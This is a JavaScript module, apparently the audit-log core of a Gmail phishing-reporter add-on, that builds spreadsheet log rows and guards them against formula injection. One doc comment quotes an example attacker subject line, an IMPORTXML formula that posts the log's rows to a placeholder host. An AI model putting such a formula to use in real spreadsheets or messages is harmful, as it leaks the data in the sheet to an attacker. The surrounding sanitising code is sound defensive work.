// ============================================================
// GENERATED FILE - DO NOT EDIT
//
// Copied verbatim from src/report-log.js by scripts/sync-appsscript.js.
// Edit the source, then run: npm run sync
// CI runs `npm run sync:check` and fails if these two drift apart.
// ============================================================

/**
 * Gmail Phishing Reporter - audit log core.
 *
 * Pure module: no Gmail, Sheets, Properties or CardService APIs, no I/O. Apps
 * Script loads it as a plain .gs file and the Node test suite requires() it,
 * which is what makes the sanitising and configuration logic testable outside
 * Google's runtime.
 *
 *   buildLogRow(report)        -> array of cell values, safe to append
 *   resolveConfig(properties)  -> { ok, sheetId, sheetName } | { ok: false, error }
 *
 * See README.md for why each rule exists.
 */
(function (root, factory) {
  const api = factory();
  if (typeof module === "object" && module.exports) {
    module.exports = api;
  } else {
    root.ReportLog = api;
  }
})(typeof globalThis !== "undefined" ? globalThis : this, function () {
  "use strict";

  // ---------------------------------------------------------------------------
  // Configuration
  // ---------------------------------------------------------------------------

  const SHEET_ID_PROPERTY = "PHISHING_LOG_SHEET_ID";
  const SHEET_NAME_PROPERTY = "PHISHING_LOG_SHEET_NAME";
  const DEFAULT_SHEET_NAME = "Phishing Reports";

  // Triage columns are appended AFTER Status rather than grouped with the
  // sender fields, so a log created by an earlier version keeps every existing
  // column meaning the same and simply gains empty trailing cells. It also
  // keeps STATUS_COLUMN where it was, which is the one index written by
  // position after the row is appended.
  const LOG_HEADERS = [
    "Timestamp",
    "Reporter",
    "Sender",
    "Subject",
    "Message ID",
    "Thread ID",
    "Action",
    "Status",
    "SPF",
    "DKIM",
    "DMARC",
    "Indicators",
    "Sender Domain",
    "Reply-To",
    "URL Count",
    "URLs",
    "Attachments"
  ];

  const STATUS_COLUMN = LOG_HEADERS.indexOf("Status") + 1;

  const STATUS_PENDING = "Logged - removal pending";
  const STATUS_TRASHED = "Moved to Trash";
  const STATUS_FAILED = "Removal failed";

  // A Sheets file id is the path segment in /spreadsheets/d/<id>/edit. Ids are
  // base64url-ish and in practice 40+ characters, but the length is not
  // contractual, so the floor here is deliberately loose.
  const SHEET_URL_PATTERN = /\/spreadsheets\/d\/([A-Za-z0-9_-]+)/;
  const SHEET_ID_PATTERN = /^[A-Za-z0-9_-]{20,}$/;

  // Sheets parses a cell as a formula when its first meaningful character is one
  // of these.
  const FORMULA_TRIGGERS = ["=", "+", "-", "@"];

  // Leading whitespace and control characters are discarded before Sheets
  // decides whether a cell is a formula, so "\t=EVIL()" is still a formula.
  // They have to be stripped here too, or a check of charAt(0) is trivially
  // bypassed by prepending a tab.
  const LEADING_NOISE = /^[\s\u0000-\u001f]+/;

  // ---------------------------------------------------------------------------
  // Cell sanitising
  // ---------------------------------------------------------------------------

  /**
   * Neutralise a value that Sheets would otherwise evaluate as a formula.
   *
   * Sender and subject arrive from the reported email, so they are entirely
   * attacker-controlled: a subject of
   *
   *   =IMPORTXML("https://evil.tld/?d="&CONCATENATE(A1:F100),"//x")
   *
   * would run the moment an analyst opened the log and post every row of the
   * audit trail to the attacker. Prefixing with an apostrophe forces Sheets to
   * treat the cell as literal text. The apostrophe is a display directive and is
   * not part of the stored value, so the log still reads back cleanly.
   *
   * Dates, numbers and booleans pass through untouched so Sheets keeps their
   * native types rather than storing them as strings.
   */
  function sanitizeCell(value) {
    if (value === null || value === undefined) {
      return "";
    }
    if (value instanceof Date || typeof value === "number" || typeof value === "boolean") {
      return value;
    }

    const text = String(value);
    const meaningful = text.replace(LEADING_NOISE, "");
    if (meaningful.length > 0 && FORMULA_TRIGGERS.indexOf(meaningful.charAt(0)) !== -1) {
      return "'" + text;
    }
    return text;
  }

  /**
   * Build the row for one report, in LOG_HEADERS order, with every cell
   * sanitised. Pure: the caller supplies the timestamp rather than the row
   * reaching for the clock itself, so the output is deterministic under test.
   */
  function buildLogRow(report) {
    const source = report || {};
    const finding = source.triage || {};
    const auth = finding.authentication || {};
    const sender = finding.sender || {};
    const urls = finding.urls || [];
    const attachments = finding.attachments || [];

    return [
      source.timestamp,
      source.reporter,
      source.sender,
      source.subject,
      source.messageId,
      source.threadId,
      source.action,
      source.status,
      auth.spf || "",
      auth.dkim || "",
      auth.dmarc || "",
      (finding.indicators || []).join(", "),
      sender.domain || "",
      sender.replyTo || "",
      urls.length,
      // Already defanged by the triage module. Capped because a cell is not a
      // place to put forty links, and the full set goes to the JSON record.
      urls.slice(0, 5).map(u => u.url).join("\n"),
      attachments.map(a => a.name + (a.notable ? " (notable)" : "")).join("\n")
    ].map(sanitizeCell);
  }

  // ---------------------------------------------------------------------------
  // Configuration resolution
  // ---------------------------------------------------------------------------

  /**
   * Accept either a bare Sheets id or a full spreadsheet URL. Pasting the URL
   * out of the browser is the common case, and silently storing it as an id
   * produces a confusing "file not found" much later.
   */
  function extractSheetId(raw) {
    if (raw === null || raw === undefined) {
      return null;
    }
    const text = String(raw).trim();
    if (text.length === 0) {
      return null;
    }

    const fromUrl = text.match(SHEET_URL_PATTERN);
    if (fromUrl) {
      return fromUrl[1];
    }
    return SHEET_ID_PATTERN.test(text) ? text : null;
  }

  /**
   * Turn the script's stored properties into a usable config, or explain what is
   * missing. The add-on shows that explanation as a setup card rather than
   * failing at the point of use.
   */
  function resolveConfig(properties) {
    const source = properties || {};
    const sheetId = extractSheetId(source[SHEET_ID_PROPERTY]);

    if (!sheetId) {
      const supplied = source[SHEET_ID_PROPERTY];
      return {
        ok: false,
        error:
          supplied === null || supplied === undefined || String(supplied).trim() === ""
            ? "No log spreadsheet configured. Set the " +
              SHEET_ID_PROPERTY +
              " script property to your spreadsheet's id or URL."
            : "The configured " +
              SHEET_ID_PROPERTY +
              " does not look like a spreadsheet id or URL."
      };
    }

    const name = source[SHEET_NAME_PROPERTY];
    const sheetName =
      name === null || name === undefined || String(name).trim() === ""
        ? DEFAULT_SHEET_NAME
        : String(name).trim();

    return { ok: true, sheetId: sheetId, sheetName: sheetName };
  }

  return {
    sanitizeCell: sanitizeCell,
    buildLogRow: buildLogRow,
    extractSheetId: extractSheetId,
    resolveConfig: resolveConfig,
    LOG_HEADERS: LOG_HEADERS,
    STATUS_COLUMN: STATUS_COLUMN,
    STATUS_PENDING: STATUS_PENDING,
    STATUS_TRASHED: STATUS_TRASHED,
    STATUS_FAILED: STATUS_FAILED,
    SHEET_ID_PROPERTY: SHEET_ID_PROPERTY,
    SHEET_NAME_PROPERTY: SHEET_NAME_PROPERTY,
    DEFAULT_SHEET_NAME: DEFAULT_SHEET_NAME,
    FORMULA_TRIGGERS: FORMULA_TRIGGERS
  };
});
